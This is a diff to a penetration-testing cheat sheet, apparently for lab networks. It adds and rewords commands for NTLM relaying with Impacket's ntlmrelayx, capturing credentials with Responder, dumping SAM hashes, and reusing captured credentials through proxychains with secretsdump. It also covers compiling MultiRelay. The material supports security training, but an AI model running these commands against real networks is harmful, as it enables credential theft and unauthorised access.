@@ -74,7 +74,7 @@ Can be finicky - you may need to uninstall / reinstall when updating if the defa
 If running inside a lab network:     
 [Use Impacket static binaries](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.22.dev-binaries), compile your own or manually install      
 
-    #manual install (if inside a lab network - will also work with most other Python packages)    
+    #manual install (recommend trying to compile a binary before doing this)       
     upload Impacket files to target and run install script    
     sudo python3 setup.py install    
     
@@ -115,15 +115,20 @@ Recon: RunFinger.py or Crackmapexec to identify hosts, OS and SMB info. Check if
 
 [NTLMRelay - Impacket Script](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
 You might need to disable the SMB or HTTP servers used by Responder to avoid conflicts.    
+Usage:     
 
     sudo python3 ntlmrelayx.py -tf targets -smb2support     
     sudo python3 ntlmrelayx.py -socks -smb2support -tf smb_targets.txt     
     
-    #To Perform a SAM dump using NTLMRelay    
+Perform a SAM dump using NTLMRelay    
     python3 ntlmrelayx.py -of hashes -tf targets.txt -smb2support    
     # then run Responder with SMB / HTTP off      
     sudo python3 Responder.py -I eth0 -dwv     
-    
+Proxychain SMB Connections - allows you to use captured creds with other Impacket scripts    
+
+    python3 ntlmrelayx.py -tf targets.txt -smb2support -socks   
+    #Config Proxychains    
+    sudo proxychains secretdump.py -no-pass <domain>/<user>@<host_ip>    #used captured creds over the Proxy         
 [MultiRelay - Built into the Responder Toolkit](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py)     
 Requirements:     
 [Pycryptdome](https://github.com/Legrandin/pycryptodome/)    
@@ -133,7 +138,7 @@ Requirements:
     cd Responder/tools/
     x86_64-w64-mingw32-gcc ./MultiRelay/bin/Runas.c -o ./MultiRelay/bin/Runas.exe -municode -lwtsapi32 -luserenv    
     x86_64-w64-mingw32-gcc ./MultiRelay/bin/Syssvc.c -o ./MultiRelay/bin/Syssvc.exe -municode     
-Compile yourself using Pyinstaller and force PyCrypto to be included:    
+Compile MultiRelay yourself using Pyinstaller and force PyCrypto to be included:    
 
     pyinstaller MultiRelay.py --hiddenimport=pycryptodomex --onefile              
 Usage:     
